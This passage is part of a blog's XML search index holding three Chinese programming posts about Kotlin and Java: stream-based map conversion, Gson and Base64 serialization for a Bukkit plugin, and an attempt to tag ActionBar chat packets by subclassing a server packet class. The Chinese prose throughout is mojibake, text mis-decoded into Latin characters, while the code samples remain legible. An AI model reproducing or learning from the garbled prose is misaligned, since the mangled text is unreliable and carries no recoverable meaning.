        <content type="html"><![CDATA[<h1 id="ä½¿ç”¨streamå¯¹mapè¿›è¡Œæ“ä½œ"><a href="#ä½¿ç”¨streamå¯¹mapè¿›è¡Œæ“ä½œ" class="headerlink" title="ä½¿ç”¨streamå¯¹mapè¿›è¡Œæ“ä½œ"></a>ä½¿ç”¨streamå¯¹mapè¿›è¡Œæ“ä½œ</h1><p>å®åœ¨æ˜¯å¤ªæ–¹ä¾¿äº†</p><p><strong>Kotlin</strong>ä»£ç :</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">// ä»ä¸€ä¸ªMap&lt;String,String&gt;ä¸­å¾—åˆ°ä¸€ä¸ªMap&lt;String,Pattern&gt;</span><span class="token comment">// åªéœ€ä¸€è¡Œä»£ç </span><span class="token punctuation">(</span>it<span class="token punctuation">[</span><span class="token string">"match"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>String<span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>entries<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>                        Collectors<span class="token punctuation">.</span><span class="token function">toMap</span><span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>String<span class="token operator">&gt;</span><span class="token operator">::</span>key<span class="token punctuation">)</span> <span class="token punctuation">{</span> e <span class="token operator">-&gt;</span>                            Pattern<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>                                e<span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"[NUMBER]"</span><span class="token punctuation">,</span> <span class="token string">"&lt;value&gt;(\\d+(\\.\\d+)?)"</span><span class="token punctuation">)</span>                                    <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&lt;NUMBER&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;value&gt;(\\d+(\\.\\d+)?)"</span><span class="token punctuation">)</span>                            <span class="token punctuation">)</span>                        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Java</strong>ä»£ç </p><pre class="line-numbers language-java" data-language="java"><code class="language-java">map<span class="token punctuation">.</span>entries<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">toMap</span><span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token operator">::</span><span class="token function">getKey</span><span class="token punctuation">,</span> entry <span class="token operator">-&gt;</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"[NUMBER]"</span><span class="token punctuation">,</span> <span class="token string">"&lt;value&gt;(\\d+(\\.\\d+)?)"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&lt;NUMBER&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;value&gt;(\\d+(\\.\\d+)?)"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åºåˆ—åŒ–çš„ä¸¤ç§å¸¸è§åšæ³•</title>
      <link href="/2021/07/20/how-to-serialize/"/>
      <url>/2021/07/20/how-to-serialize/</url>
      
        <content type="html"><![CDATA[<p>æœ€å¸¸è§çš„åšæ³•æ— éä¸¤ç§ï¼šåºåˆ—åŒ–æˆ<strong>json</strong>æˆ–è€…<strong>base64</strong></p><h2 id="Json"><a href="#Json" class="headerlink" title="Json"></a>Json</h2><p>è¦å°†ä¸€ä¸ªå®ä¾‹åºåˆ—åŒ–æˆJsonä¿¡æ¯ä¸€èˆ¬éƒ½éœ€è¦å€ŸåŠ©<strong>å¤–éƒ¨åº“</strong></p><p>æ¯”è¾ƒå¸¸ç”¨çš„åº“æœ‰ä¸¤ç§ï¼šè°·æ­Œçš„<strong>gson</strong>ï¼Œé˜¿é‡Œçš„<strong>fastjson</strong></p><p>ç”±äºæˆ‘æ¥è§¦çš„å¼€å‘è€…ä»¬éƒ½æ¯”è¾ƒé’çgsonï¼Œè€Œä¸”Spigotæ ¸å¿ƒç”šè‡³å†…ç½®äº†ä¸€ä¸ªgsonåº“ï¼ˆè™½ç„¶ç‰ˆæœ¬æœ‰ç‚¹è€äº†ï¼‰</p><p>æ‰€ä»¥å¯¹æˆ‘ä¸ªäººè€Œè¨€ï¼Œä½¿ç”¨gsonè¿›è¡Œåºåˆ—åŒ–æ“ä½œæ›´åŠ å®¹æ˜“</p><p>åªéœ€è¦çŸ­çŸ­æ•°è¡Œä»£ç ï¼Œä¾¿èƒ½è½»æ¾çš„åºåˆ—åŒ–/ååºåˆ—åŒ–ä¸€ä¸ªå®ä¾‹</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">// åºåˆ—åŒ–å®ä¾‹</span><span class="token keyword">val</span> string<span class="token operator">:</span> String <span class="token operator">=</span> <span class="token function">Gson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span>instance<span class="token punctuation">)</span><span class="token comment">// ååºåˆ—åŒ–</span><span class="token keyword">val</span> obj<span class="token operator">:</span> Any <span class="token operator">=</span> <span class="token function">Gson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fromJson</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span> Any<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">)</span><span class="token comment">// é›†åˆæ“ä½œ</span><span class="token keyword">val</span> str<span class="token operator">:</span> String <span class="token operator">=</span> <span class="token function">Gson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toJson</span><span class="token punctuation">(</span><span class="token function">arrayListOf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">val</span> list<span class="token operator">:</span> ArrayList<span class="token operator">&lt;</span>String<span class="token operator">&gt;</span> <span class="token operator">=</span> <span class="token function">Gson</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fromJson</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token keyword">object</span> <span class="token operator">:</span> TypeToken<span class="token operator">&lt;</span>ArrayList<span class="token operator">&lt;</span>String<span class="token operator">&gt;</span><span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>type<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æˆ‘æœ€å¼€å§‹åˆ©ç”¨gsonåºåˆ—åŒ–çš„éƒ½æ˜¯ä¸€äº›é‡Œé¢éƒ½å¡çš„æ˜¯åŸç”Ÿæ•°æ®ç±»å‹çš„é›†åˆæˆ–è€…Mapï¼Œæ‰€ä»¥ç†æ‰€å½“ç„¶çš„è®¤ä¸ºgsonå¯ä»¥ç›´æ¥åºåˆ—åŒ–æ‰€æœ‰ç±»å‹çš„å®ä¾‹</p><p>äºæ˜¯æˆ‘åƒäº†ä¸ªå¤§äº</p><p>åœ¨å°è¯•åºåˆ—åŒ–æˆ‘è‡ªå·±å†™çš„ç±»å®ä¾‹åŒ–å‡ºæ¥çš„å®ä¾‹æ—¶ï¼Œæˆ‘å‘ç°å®ƒä»¬åºåˆ—åŒ–å‡ºæ¥éƒ½æ˜¯{}ï¼Œè¿™å¯¼è‡´äº†æˆ‘ä¹‹åååºåˆ—åŒ–æ“ä½œé€ æˆçš„<strong>NullPointerException</strong></p><p>è¦å‘½çš„æ˜¯ï¼Œå› ä¸ºè¿™ä¸ªç©ºæŒ‡é’ˆï¼Œæˆ‘å„ç§æ£€æŸ¥è‡ªå·±çš„ä»£ç ï¼Œæ£€æŸ¥åˆ°æ€€ç–‘äººç”Ÿï¼Œæ‰€æœ‰çš„éç©ºæ£€æµ‹éƒ½åšäº†ï¼Œå°±è¿˜æ˜¯ä¼šæŠ›å‡ºè¿™ä¸ªå¼‚å¸¸</p><p>è¯´å¥½çš„<strong>Kotlin</strong>å¹²ç¿»ç©ºæŒ‡é’ˆå‘¢ï¼ï¼ˆç¬‘ï¼‰</p><p>ç›´åˆ°æœ€åçš„æœ€åï¼Œæˆ‘æ£€æŸ¥äº†æ•°æ®åº“ä¸­å‚¨å­˜çš„åºåˆ—åŒ–ä¹‹åå‚¨å­˜çš„æ•°æ®ï¼Œæ‰å‘ç°è¿™ä¸ªé”™è¯¯</p><p><strong>åŸæ¥ï¼ŒGsonåºåˆ—åŒ–è‡ªå·±å»ºçš„ç±»çš„å®ä¾‹ï¼Œæ˜¯éœ€è¦åšä¸€äº›æ“ä½œï¼Œå°†è¿™äº›ç±»æ³¨å†Œåˆ°Gsonå®ä¾‹ä¸­çš„</strong></p><p>å…·ä½“æ“ä½œ</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">// ä»£ç æ¥è‡ª TabooLib io.izzel.taboolib.kotlin.Serializer</span><span class="token comment">// æ³¨å†Œå¯¹åº”ç±»çš„TypeHierarchAdapteræ‰èƒ½åºåˆ—åŒ–è¿™ä¸ªç±»çš„å®ä¾‹</span>    <span class="token keyword">val</span> gson <span class="token operator">=</span> <span class="token function">GsonBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setPrettyPrinting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">excludeFieldsWithoutExposeAnnotation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">also</span> <span class="token punctuation">{</span>        it<span class="token punctuation">.</span><span class="token function">registerTypeHierarchyAdapter</span><span class="token punctuation">(</span>Location<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">,</span> <span class="token function">TypeLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        it<span class="token punctuation">.</span><span class="token function">registerTypeHierarchyAdapter</span><span class="token punctuation">(</span>ItemStack<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">,</span> <span class="token function">TypeItemStack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        it<span class="token punctuation">.</span><span class="token function">registerTypeHierarchyAdapter</span><span class="token punctuation">(</span>SecuredFile<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">,</span> <span class="token function">TypeSecuredFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        it<span class="token punctuation">.</span><span class="token function">registerTypeHierarchyAdapter</span><span class="token punctuation">(</span>YamlConfiguration<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">,</span> <span class="token function">TypeYamlConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        SerializerAdapter<span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">forEach</span> <span class="token punctuation">{</span> <span class="token punctuation">(</span>k<span class="token punctuation">,</span> v<span class="token punctuation">)</span> <span class="token operator">-&gt;</span>            it<span class="token punctuation">.</span><span class="token function">registerTypeHierarchyAdapter</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">!!</span><span class="token comment">// TypeAdapter</span><span class="token comment">// è¿™é‡Œä»¥Locationçš„TypeAdapterä¸ºä¾‹</span>    <span class="token keyword">class</span> TypeLocation <span class="token operator">:</span> JsonSerializer<span class="token operator">&lt;</span>Location<span class="token operator">&gt;</span><span class="token punctuation">,</span> JsonDeserializer<span class="token operator">&lt;</span>Location<span class="token operator">&gt;</span> <span class="token punctuation">{</span>        <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">serialize</span><span class="token punctuation">(</span>a<span class="token operator">:</span> Location<span class="token punctuation">,</span> p1<span class="token operator">:</span> Type<span class="token punctuation">,</span> p2<span class="token operator">:</span> JsonSerializationContext<span class="token punctuation">)</span><span class="token operator">:</span> JsonElement <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">JsonObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">also</span> <span class="token punctuation">{</span>                it<span class="token punctuation">.</span><span class="token function">addProperty</span><span class="token punctuation">(</span><span class="token string">"world"</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>world<span class="token operator">!!</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span>                it<span class="token punctuation">.</span><span class="token function">addProperty</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>x<span class="token punctuation">)</span>                it<span class="token punctuation">.</span><span class="token function">addProperty</span><span class="token punctuation">(</span><span class="token string">"y"</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>y<span class="token punctuation">)</span>                it<span class="token punctuation">.</span><span class="token function">addProperty</span><span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>z<span class="token punctuation">)</span>                it<span class="token punctuation">.</span><span class="token function">addProperty</span><span class="token punctuation">(</span><span class="token string">"yaw"</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>yaw<span class="token punctuation">)</span>                it<span class="token punctuation">.</span><span class="token function">addProperty</span><span class="token punctuation">(</span><span class="token string">"pitch"</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>pitch<span class="token punctuation">)</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>a<span class="token operator">:</span> JsonElement<span class="token punctuation">,</span> p1<span class="token operator">:</span> Type<span class="token operator">?</span><span class="token punctuation">,</span> p2<span class="token operator">:</span> JsonDeserializationContext<span class="token punctuation">)</span><span class="token operator">:</span> Location <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">Location</span><span class="token punctuation">(</span>                Bukkit<span class="token punctuation">.</span><span class="token function">getWorld</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>asJsonObject<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>asString<span class="token punctuation">)</span><span class="token punctuation">,</span>                a<span class="token punctuation">.</span>asJsonObject<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>asDouble<span class="token punctuation">,</span>                a<span class="token punctuation">.</span>asJsonObject<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"y"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>asDouble<span class="token punctuation">,</span>                a<span class="token punctuation">.</span>asJsonObject<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>asDouble<span class="token punctuation">,</span>                a<span class="token punctuation">.</span>asJsonObject<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"yaw"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>asFloat<span class="token punctuation">,</span>                a<span class="token punctuation">.</span>asJsonObject<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"pitch"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>asFloat            <span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨GsonBuilderä¸­æ³¨å†Œç±»å’ŒAdapteråæ„é€ å‡ºæ¥çš„Gsonå®ä¾‹ä¾¿å¯ä»¥åºåˆ—åŒ–/ååºåˆ—åŒ–å¯¹åº”çš„ç±»</p><p>æ“ä½œç®—ä¸ä¸Šå¤æ‚ï¼Œä½†ä¹Ÿä¸ç®—è½»æ¾</p><p>å¯¹äºåªæ˜¯æƒ³æŠŠå®ä¾‹å­˜æ•°æ®åº“çš„æˆ‘æ¥è¯´ï¼Œè¿™äº›æ“ä½œè¿˜æ˜¯æœ‰äº›ç¹çäº†</p><p>æ‰€ä»¥ï¼Œå¦‚æœåªæ˜¯æƒ³æŠŠå®ä¾‹æ‰”æ•°æ®åº“é‡Œå‚¨å­˜ï¼Œä½¿ç”¨<strong>Base64</strong>æ›´åŠ åˆé€‚</p><h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><p>base64ä¸éœ€è¦åƒgsoné‚£æ ·åšç¹ççš„æ“ä½œï¼Œå°±å¯ä»¥å¯¹ä¸€ä¸ªå®ä¾‹è¿›è¡Œè½»æ¾çš„åºåˆ—åŒ–/ååºåˆ—åŒ–æ“ä½œ</p><p>å¹¶ä¸”ï¼Œåœ¨ç°æœ‰çš„Javaç‰ˆæœ¬ä¸­ï¼Œä½¿ç”¨Base64ä¸å†éœ€è¦å€ŸåŠ©ä»»ä½•å¤–éƒ¨åº“</p><p><strong>å”¯ä¸€çš„ç¼ºç‚¹æ˜¯ï¼Œå®ƒåºåˆ—å‡ºæ¥çš„å­—ç¬¦ä¸²å¹¶ä¸åƒJsonå­—ç¬¦ä¸²ï¼Œå¯ä»¥ç”¨è‚‰çœ¼çœ‹å‡ºæ¥å…¶ä¸­è•´å«çš„ä¿¡æ¯</strong></p><p>ä½†åœ¨æ•°æ®åº“æ“ä½œä¸­ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦è®©ç”¨æˆ·çŸ¥é“è¿™äº›å­—ç¬¦çš„å«ä¹‰ï¼Œå¹¶ä¿®æ”¹å®ƒä»¬</p><p>æ‰€ä»¥ï¼Œç”¨å®ƒåºåˆ—åŒ–å®ä¾‹å†æ‰”è¿›SQLå®åœ¨æ˜¯å†åˆé€‚ä¸è¿‡äº†</p><p>ä¸Šä»£ç </p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">// ä»£ç æ¥è‡ªSacredHUD</span><span class="token comment">// Base64 encode</span><span class="token keyword">fun</span> HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> BitMapData<span class="token punctuation">.</span>Personal<span class="token operator">&gt;</span><span class="token punctuation">.</span><span class="token function">toBase64</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> String <span class="token punctuation">{</span>    <span class="token function">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span> <span class="token punctuation">{</span> byteArrayOutputStream <span class="token operator">-&gt;</span>        <span class="token function">BukkitObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span> <span class="token punctuation">{</span> bukkitObjectOutputStream <span class="token operator">-&gt;</span>            bukkitObjectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> Base64<span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// Base64 decode</span><span class="token annotation builtin">@Suppress</span><span class="token punctuation">(</span><span class="token string">"UNCHECKED_CAST"</span><span class="token punctuation">)</span><span class="token keyword">fun</span> String<span class="token punctuation">.</span><span class="token function">base64ToBitmapData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> BitMapData<span class="token punctuation">.</span>Personal<span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token function">ByteArrayInputStream</span><span class="token punctuation">(</span>Base64<span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span> <span class="token punctuation">{</span> byteArrayInputStream <span class="token operator">-&gt;</span>        <span class="token function">BukkitObjectInputStream</span><span class="token punctuation">(</span>byteArrayInputStream<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span> <span class="token punctuation">{</span> bukkitObjectInputStream <span class="token operator">-&gt;</span>            <span class="token keyword">return</span> bukkitObjectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> BitMapData<span class="token punctuation">.</span>Personal<span class="token operator">&gt;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Java </tag>
            
            <tag> å¤–éƒ¨åº“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NMSè›‹ç–¼çš„éæ³•åŒ…æ£€æµ‹</title>
      <link href="/2021/07/18/nms-packet-name-check/"/>
      <url>/2021/07/18/nms-packet-name-check/</url>
      
        <content type="html"><![CDATA[<p>æ•…äº‹èµ·å› å¤§æ¦‚æ˜¯è¿™æ ·çš„â€¦<br>æ˜¨å¤©æˆ‘éœ€è¦åšä¸€ä¸ªæ‹¦æˆªæœ¬æ’ä»¶ä»¥å¤–æ‰€æœ‰Actionbarä¿¡æ¯çš„åŠŸèƒ½<br>æœ€å¼€å§‹æˆ‘è‡ªç„¶è€Œç„¶çš„æƒ³åˆ°äº†ç›‘å¬<strong>PacketPlayOutChat</strong>æ•°æ®åŒ…ï¼Œé€šè¿‡åˆ¤æ–­å®ƒçš„å†…å®¹æ˜¯å¦ç¬¦åˆæ¡ä»¶æ¥è¾¨åˆ«è¿™ä¸ªActionbaræ˜¯å¦ä¸ºæˆ‘æ’ä»¶å‘é€çš„Actionbarä¿¡æ¯<br><strong>ä½†è¿™æ ·å®åœ¨æ˜¯å¤ªlowäº†</strong>ï¼Œæˆ‘ä¸å–œæ¬¢åˆ©ç”¨å…¶å‘é€çš„æ–‡æœ¬å†…å®¹è¿›è¡Œåˆ¤æ–­ã€‚å°±åƒåšGUIï¼Œæ¯”èµ·åˆ¤æ–­GUIçš„titleï¼Œå½“ç„¶æ˜¯åˆ¤æ–­InventoryHolderçš„åšæ³•æ›´å¥½ã€‚<br>äºæ˜¯æˆ‘è½¬å‘ç ”ç©¶èƒ½å¦ç»™è¿™ä¸ªæ•°æ®åŒ…æœ¬èº«åŠ ä¸Šä¸€ä¸ªæ ‡è®°ï¼Œè¿›è€Œæ–¹ä¾¿æˆ‘ä»¬è¾¨è¯†è¿™ä¸ªæ•°æ®åŒ…<br>äºæ˜¯æˆ‘æƒ³åˆ°äº†è®©ä¸€ä¸ªç±»ç»§æ‰¿PacketPlayOutChatï¼Œç”¨è¿™ä¸ªç±»æ¥å‘åŒ…çš„åŠæ³•<br>å¹¶ä¸”åˆ©ç”¨Taboolibçš„<strong>ASMVersionControl</strong>ï¼Œè¿˜å¯ä»¥å®ç°è¿™ä¸ªå¯¹è¿™ä¸ªç±»çš„ç‰ˆæœ¬æ§åˆ¶<br>åªéœ€è¦å¯¹ç›‘å¬åˆ°çš„æ•°æ®åŒ…çš„ç±»è¿›è¡Œåˆ¤æ–­ï¼Œä¾¿å¯ä»¥è½»æ˜“è¾¨åˆ«<br>å½“æ—¶æˆ‘æƒ³åˆ°çš„æ—¶å€™æ„Ÿè§‰è‡ªå·±çœŸæ˜¯ç‰›é€¼åäº†<br>å¤§è‡´åšæ³•å¦‚ä¸‹<br><strong>ç»§æ‰¿PacketPlayOutChat</strong></p><pre class="line-numbers language-none"><code class="language-none">class LegalActionBarPacket(iChatBaseComponent: IChatBaseComponent, chatMessageType: ChatMessageType, uuid: UUID) : PacketPlayOutChat(iChatBaseComponent,chatMessageType,uuid)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>ASMVersionControl</strong></p><pre class="line-numbers language-none"><code class="language-none">val legalPacketClass = AsmVersionControl.createNMS("me.asgard.coldrain.hud.module.nms.LegalActionBarPacket").mapping().translate(SacredHUD.plugin) <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>æ•°æ®åŒ…ç›‘å¬</strong></p><pre class="line-numbers language-none"><code class="language-none">@TPacket(type = TPacket.Type.SEND)private fun send(player: Player, packet: Packet): Boolean {    if (packet.equals("PacketPlayOutChat")            &amp;&amp; packet.read("b").reflex&lt;Byte&gt;("d") == 2.toByte()            &amp;&amp; packet.get().javaClass != legalPacketClass){        return false    }    return true}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åæˆ‘æ´‹æ´‹å¾—æ„çš„ç¼–è¯‘å‡ºæ¥æ‰”è¿›æœåŠ¡å™¨é‡Œï¼Œå¯¹è‡ªå·±å‘äº†ä¸€ä¸ªlegalPacket<br>å¯ç¬‘çš„æ˜¯ï¼Œè¿™ä¸ªæˆ‘å–åçš„legalPacketï¼Œè¢«æœåŠ¡ç«¯è®¤ä¸ºæ˜¯ä¸€ä¸ªilegal packetï¼Œæˆ‘ç›´æ¥æ‰çº¿</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Bukkit </tag>
            
            <tag> TabooLib </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
